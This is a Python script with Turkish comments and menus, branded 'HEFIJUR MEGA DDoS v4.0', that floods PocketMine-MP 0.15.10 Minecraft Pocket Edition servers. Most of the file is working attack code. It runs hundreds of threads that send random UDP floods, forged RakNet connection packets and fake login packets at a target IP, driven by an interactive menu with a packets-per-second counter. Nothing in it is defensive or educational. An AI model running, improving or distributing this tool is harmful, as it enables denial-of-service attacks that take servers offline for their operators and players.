#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PMMP 0.15.10 HEFIJUR MEGA DDoS v4.0 - 20x GÜÇLENDİRİLMİŞ
HefijurHuseyn tarafından yapılmıştır
"""

import socket
import random
import time
import struct
import threading
import sys
import os
import multiprocessing

# Renkler için sınıf
class Renk:
    KIRMIZI = '\033[91m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    MAVI = '\033[94m'
    MOR = '\033[95m'
    TURKUAZ = '\033[96m'
    BEYAZ = '\033[97m'
    PEMBE = '\033[95m'
    SON = '\033[0m'
    KALIN = '\033[1m'

# ASCII Art - Tamamen kırmızı
ASCII_ART = f"""
{Renk.KIRMIZI}{Renk.KALIN}██╗  ██╗███████╗███████╗██╗     ██╗██╗   ██╗██████╗ 
{Renk.KIRMIZI}██║  ██║██╔════╝██╔════╝██║     ██║██║   ██║██╔══██╗
{Renk.KIRMIZI}███████║█████╗  █████╗  ██║     ██║██║   ██║██║  ██║
{Renk.KIRMIZI}██╔══██║██╔══╝  ██╔══╝  ██║     ██║██║   ██║██║  ██║
{Renk.KIRMIZI}██║  ██║███████╗██║     ███████╗██║╚██████╔╝██████╔╝
{Renk.KIRMIZI}╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝ ╚═════╝ ╚═════╝ 
{Renk.TURKUAZ}═══════════ HEFIJUR MEGA DDoS v4.0 ═══════════
{Renk.BEYAZ}     PMMP 0.15.10 - 20x GÜÇLENDİRİLMİŞ
{Renk.SARI}     HefijurHuseyn tarafından yapılmıştır
{Renk.SON}"""

# RakNet sabitleri
MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

class RakNetPackets:
    @staticmethod
    def open_connection_1(protocol=28):
        packet = b'\x05' + MAGIC + bytes([protocol]) + struct.pack('>H', 1492)
        packet += b'\x00' * (1492 - len(packet) - 2)
        return packet
    
    @staticmethod
    def open_connection_2(client_id):
        packet = b'\x07' + MAGIC + socket.inet_aton('0.0.0.0')
        packet += struct.pack('>H', 19132) + struct.pack('>H', 1492) + struct.pack('>Q', client_id)
        return packet

class MCPEPackets:
    @staticmethod
    def login_packet(username, client_id):
        packet = b'\x8f' + struct.pack('<i', 28)
        packet += username.encode('utf-8')[:16] + b'\x00'
        packet += struct.pack('<q', client_id)
        packet += bytes([random.randint(0,255) for _ in range(100)])
        return packet

class HefijurDDoS:
    def __init__(self):
        self.devam = False
        self.toplam_paket = 0
        self.kilit = threading.Lock()
        self.socketler = []
        self.aktif_thread = 0
        
    def udp_saldiri(self, ip, port, sure, paket_boyutu=1024):
        """UDP saldırısı - ana saldırı"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            with self.kilit:
                self.socketler.append(sock)
                self.aktif_thread += 1
            
            veri = random._urandom(paket_boyutu)
            bitis = time.time() + sure
            sayac = 0
            
            while self.devam and time.time() < bitis:
                # 20x güç: her döngüde 2000 paket
                for _ in range(2000):
                    sock.sendto(veri, (ip, port))
                    sayac += 1
                
                with self.kilit:
                    self.toplam_paket += 2000
                    
        except Exception as e:
            pass
        finally:
            with self.kilit:
                self.aktif_thread -= 1
    
    def raknet_saldiri(self, ip, port, sure):
        """RakNet saldırısı"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            with self.kilit:
                self.socketler.append(sock)
                self.aktif_thread += 1
            
            client_id = random.randint(1, 9999999999)
            bitis = time.time() + sure
            protokoller = [28, 30, 33, 40, 42]
            
            while self.devam and time.time() < bitis:
                for proto in protokoller:
                    for _ in range(100):  # 20x güç
                        p1 = RakNetPackets.open_connection_1(proto)
                        p2 = RakNetPackets.open_connection_2(client_id)
                        sock.sendto(p1, (ip, port))
                        sock.sendto(p2, (ip, port))
                        client_id += 1
                        
                        with self.kilit:
                            self.toplam_paket += 2
                            
        except Exception as e:
            pass
        finally:
            with self.kilit:
                self.aktif_thread -= 1
    
    def mcpe_saldiri(self, ip, port, sure):
        """MCPE login saldırısı"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            with self.kilit:
                self.socketler.append(sock)
                self.aktif_thread += 1
            
            bitis = time.time() + sure
            
            while self.devam and time.time() < bitis:
                for _ in range(500):  # 20x güç
                    client_id = random.randint(1, 9999999999)
                    username = f"Hefijur{random.randint(1,9999)}"
                    login = MCPEPackets.login_packet(username, client_id)
                    sock.sendto(login, (ip, port))
                    
                    with self.kilit:
                        self.toplam_paket += 1
                        
        except Exception as e:
            pass
        finally:
            with self.kilit:
                self.aktif_thread -= 1
    
    def baslat(self, ip, port=19132, thread_sayisi=500, sure=60, tip=1):
        """Saldırıyı başlat"""
        self.devam = True
        self.toplam_paket = 0
        self.aktif_thread = 0
        self.socketler = []
        
        # Ekranı temizle
        os.system('clear')
        print(ASCII_ART)
        
        print(f"\n{Renk.SARI}╔{'═'*60}╗{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.BEYAZ}{Renk.KALIN}                 SALDIRI BAŞLATILDI{Renk.SARI}                    ║{Renk.SON}")
        print(f"{Renk.SARI}╠{'═'*60}╣{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.TURKUAZ} Hedef IP: {Renk.BEYAZ}{ip}{' '*(47-len(ip))}{Renk.SARI}║{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.TURKUAZ} Port: {Renk.BEYAZ}{port}{' '*(52-len(str(port)))}{Renk.SARI}║{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.TURKUAZ} Thread: {Renk.BEYAZ}{thread_sayisi}{' '*(50-len(str(thread_sayisi)))}{Renk.SARI}║{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.TURKUAZ} Süre: {Renk.BEYAZ}{sure} saniye{' '*(48-len(str(sure)))}{Renk.SARI}║{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.TURKUAZ} Tip: {Renk.BEYAZ}{tip}. yöntem{' '*(48)}{Renk.SARI}║{Renk.SON}")
        print(f"{Renk.SARI}║{Renk.KIRMIZI} 20x GÜÇ MODU AKTİF!{Renk.SARI}                                         ║{Renk.SON}")
        print(f"{Renk.SARI}╚{'═'*60}╝{Renk.SON}")
        
        print(f"\n{Renk.YESIL}[+] Thread'ler başlatılıyor...{Renk.SON}")
        
        baslangic = time.time()
        thread_list = []
        
        # Thread'leri başlat
        for i in range(thread_sayisi):
            if tip == 1:
                t = threading.Thread(target=self.udp_saldiri, args=(ip, port, sure, 1024))
            elif tip == 2:
                t = threading.Thread(target=self.raknet_saldiri, args=(ip, port, sure))
            elif tip == 3:
                t = threading.Thread(target=self.mcpe_saldiri, args=(ip, port, sure))
            else:
                # Karışık
                if i % 3 == 0:
                    t = threading.Thread(target=self.udp_saldiri, args=(ip, port, sure, 1024))
                elif i % 3 == 1:
                    t = threading.Thread(target=self.raknet_saldiri, args=(ip, port, sure))
                else:
                    t = threading.Thread(target=self.mcpe_saldiri, args=(ip, port, sure))
            
            t.daemon = True
            t.start()
            thread_list.append(t)
            
            if i % 50 == 0:
                print(f"{Renk.YESIL}[+] {i} thread başlatıldı...{Renk.SON}")
        
        print(f"{Renk.KIRMIZI}[+] {thread_sayisi} THREAD BAŞLATILDI!{Renk.SON}\n")
        
        # İlerleme takibi
        try:
            gecen = 0
            maks_pps = 0
            
            while gecen < sure:
                time.sleep(1)
                gecen = time.time() - baslangic
                kalan = sure - int(gecen)
                
                if gecen > 0:
                    pps = self.toplam_paket / gecen
                    if pps > maks_pps:
                        maks_pps = pps
                else:
                    pps = 0
                
                sys.stdout.write(f"\r{Renk.MOR}[Kalan: {kalan:3d} sn] [Paket: {self.toplam_paket:9d}] [PPS: {pps:7.1f}] [Max: {maks_pps:7.1f}] [Aktif: {self.aktif_thread:3d}]{Renk.SON}")
                sys.stdout.flush()
                
        except KeyboardInterrupt:
            print(f"\n\n{Renk.KIRMIZI}[!] Saldırı durduruldu!{Renk.SON}")
            self.devam = False
        
        self.devam = False
        
        # Thread'lerin bitmesini bekle
        for t in thread_list:
            t.join(timeout=1)
        
        # Socket'leri kapat
        for sock in self.socketler:
            try:
                sock.close()
            except:
                pass
        
        gecen_sure = time.time() - baslangic
        print(f"\n\n{Renk.YESIL}╔{'═'*60}╗{Renk.SON}")
        print(f"{Renk.YESIL}║{Renk.BEYAZ}{Renk.KALIN}              SALDIRI TAMAMLANDI{Renk.YESIL}                       ║{Renk.SON}")
        print(f"{Renk.YESIL}╠{'═'*60}╣{Renk.SON}")
        print(f"{Renk.YESIL}║{Renk.TURKUAZ} Süre: {Renk.BEYAZ}{gecen_sure:.2f} saniye{' '*(46)}{Renk.YESIL}║{Renk.SON}")
        print(f"{Renk.YESIL}║{Renk.TURKUAZ} Toplam Paket: {Renk.BEYAZ}{self.toplam_paket}{' '*(42-len(str(self.toplam_paket)))}{Renk.YESIL}║{Renk.SON}")
        print(f"{Renk.YESIL}║{Renk.TURKUAZ} Ortalama PPS: {Renk.BEYAZ}{self.toplam_paket/gecen_sure:.1f}{' '*(41)}{Renk.YESIL}║{Renk.SON}")
        print(f"{Renk.YESIL}║{Renk.TURKUAZ} Maksimum PPS: {Renk.BEYAZ}{maks_pps:.1f}{' '*(41)}{Renk.YESIL}║{Renk.SON}")
        print(f"{Renk.YESIL}╚{'═'*60}╝{Renk.SON}")
        print(f"{Renk.SARI}\nHefijurHuseyn tarafından yapılmıştır{Renk.SON}")

def sunucu_sorgula():
    """Basit sunucu sorgulama"""
    os.system('clear')
    print(ASCII_ART)
    
    print(f"\n{Renk.MAVI}╔{'═'*60}╗{Renk.SON}")
    print(f"{Renk.MAVI}║{Renk.BEYAZ}{Renk.KALIN}              SUNUCU SORGULAMA{Renk.MAVI}                         ║{Renk.SON}")
    print(f"{Renk.MAVI}╠{'═'*60}╣{Renk.SON}")
    
    ip = input(f"{Renk.MAVI}║{Renk.TURKUAZ} Sunucu IP: {Renk.BEYAZ}")
    
    if not ip:
        print(f"{Renk.MAVI}║{Renk.KIRMIZI} IP girilmedi!{Renk.MAVI}                                         ║{Renk.SON}")
        print(f"{Renk.MAVI}╚{'═'*60}╝{Renk.SON}")
        input(f"\n{Renk.SARI}[!] Devam için Enter...{Renk.SON}")
        return
    
    try:
        port = int(input(f"{Renk.MAVI}║{Renk.TURKUAZ} Port [19132]: {Renk.BEYAZ}").strip() or "19132")
    except:
        port = 19132
    
    print(f"{Renk.MAVI}╚{'═'*60}╝{Renk.SON}")
    
    print(f"\n{Renk.SARI}[!] Sunucu sorgulanıyor: {ip}:{port}{Renk.SON}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        
        # Ping paketi gönder
        packet = b'\x01' + struct.pack('>Q', int(time.time()*1000)) + b'\x00'*8 + MAGIC
        sock.sendto(packet, (ip, port))
        
        data, addr = sock.recvfrom(2048)
        sock.close()
        
        if data and data[0] == 0x1c:
            print(f"{Renk.YESIL}[+] Sunucu AKTİF!{Renk.SON}")
            
            # Sunucu bilgilerini çöz
            try:
                info_start = 33
                info = data[info_start:].decode('utf-8', errors='ignore').split(';')
                
                print(f"\n{Renk.TURKUAZ}Sunucu Bilgileri:{Renk.SON}")
                print(f"  {Renk.BEYAZ}İsim: {info[0] if len(info)>0 else '?'}{Renk.SON}")
                print(f"  {Renk.BEYAZ}MOTD: {info[1] if len(info)>1 else '?'}{Renk.SON}")
                print(f"  {Renk.BEYAZ}Oyun: {info[2] if len(info)>2 else '?'}{Renk.SON}")
                print(f"  {Renk.BEYAZ}Versiyon: {info[3] if len(info)>3 else '?'}{Renk.SON}")
                print(f"  {Renk.BEYAZ}Oyuncular: {info[4] if len(info)>4 else '0'}/{info[5] if len(info)>5 else '0'}{Renk.SON}")
            except:
                print(f"{Renk.SARI}[!] Sunucu bilgileri çözülemedi{Renk.SON}")
        else:
            print(f"{Renk.KIRMIZI}[-] Sunucu cevap vermiyor!{Renk.SON}")
            
    except socket.timeout:
        print(f"{Renk.KIRMIZI}[-] Zaman aşımı! Sunucu kapalı olabilir.{Renk.SON}")
    except Exception as e:
        print(f"{Renk.KIRMIZI}[-] Hata: {e}{Renk.SON}")
    
    input(f"\n{Renk.SARI}[!] Devam için Enter...{Renk.SON}")

def ana_menu():
    """Ana menü"""
    ddos = HefijurDDoS()
    
    while True:
        os.system('clear')
        print(ASCII_ART)
        
        print(f"\n{Renk.MOR}╔{'═'*60}╗{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.BEYAZ}{Renk.KALIN}              HEFIJUR 20x MEGA DDoS v4.0{Renk.MOR}                ║{Renk.SON}")
        print(f"{Renk.MOR}╠{'═'*60}╣{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 1. Sunucu Sorgula{Renk.MOR}                                            ║{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 2. UDP Saldırısı (20x Güç){Renk.MOR}                                  ║{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 3. RakNet Saldırısı (20x Güç){Renk.MOR}                               ║{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 4. MCPE Login Saldırısı (20x Güç){Renk.MOR}                           ║{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 5. KARIŞIK Saldırı (EN GÜÇLÜ){Renk.MOR}                                ║{Renk.SON}")
        print(f"{Renk.MOR}║{Renk.YESIL} 6. Çıkış{Renk.MOR}                                                    ║{Renk.SON}")
        print(f"{Renk.MOR}╚{'═'*60}╝{Renk.SON}")
        
        print(f"\n{Renk.PEMBE}HefijurHuseyn - PMMP 0.15.10 Uzmanı{Renk.SON}")
        
        secim = input(f"\n{Renk.KIRMIZI}[?] Seçim (1-6): {Renk.BEYAZ}").strip()
        
        if secim == "1":
            sunucu_sorgula()
            
        elif secim in ["2", "3", "4", "5"]:
            ip = input(f"{Renk.TURKUAZ}[?] Hedef IP: {Renk.BEYAZ}").strip()
            if not ip:
                ip = "192.168.1.100"
                print(f"{Renk.SARI}Varsayılan: {ip}{Renk.SON}")
            
            try:
                port = int(input(f"{Renk.TURKUAZ}[?] Port [19132]: {Renk.BEYAZ}").strip() or "19132")
            except:
                port = 19132
            
            try:
                thread = int(input(f"{Renk.TURKUAZ}[?] Thread sayısı (100-2000) [500]: {Renk.BEYAZ}").strip() or "500")
                thread = max(100, min(thread, 2000))
            except:
                thread = 500
            
            try:
                sure = int(input(f"{Renk.TURKUAZ}[?] Süre (saniye) [60]: {Renk.BEYAZ}").strip() or "60")
            except:
                sure = 60
            
            # Saldırı tipini belirle
            tip_map = {"2": 1, "3": 2, "4": 3, "5": 4}
            tip = tip_map.get(secim, 1)
            
            # Onay
            print(f"\n{Renk.SARI}╔{'═'*60}╗{Renk.SON}")
            print(f"{Renk.SARI}║{Renk.KIRMIZI} Hedef: {ip}:{port}{Renk.SARI}                                          ║{Renk.SON}")
            print(f"{Renk.SARI}║{Renk.KIRMIZI} Thread: {thread}{Renk.SARI}                                            ║{Renk.SON}")
            print(f"{Renk.SARI}║{Renk.KIRMIZI} Süre: {sure} saniye{Renk.SARI}                                         ║{Renk.SON}")
            print(f"{Renk.SARI}║{Renk.KIRMIZI} 20x GÜÇ MODU AKTİF!{Renk.SARI}                                        ║{Renk.SON}")
            print(f"{Renk.SARI}╚{'═'*60}╝{Renk.SON}")
            
            onay = input(f"\n{Renk.KIRMIZI}[!] Saldırıyı başlat? (e/h): {Renk.BEYAZ}").strip().lower()
            if onay == 'e':
                ddos.baslat(ip, port, thread, sure, tip)
            
        elif secim == "6":
            print(f"{Renk.SARI}[!] Çıkılıyor...{Renk.SON}")
            break
        else:
            print(f"{Renk.KIRMIZI}[!] Geçersiz seçim!{Renk.SON}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ana_menu()
    except KeyboardInterrupt:
        print(f"\n{Renk.KIRMIZI}[!] Çıkılıyor...{Renk.SON}")
        sys.exit(0)
    except Exception as e:
        print(f"{Renk.KIRMIZI}Hata: {e}{Renk.SON}")
        input("Devam için Enter...")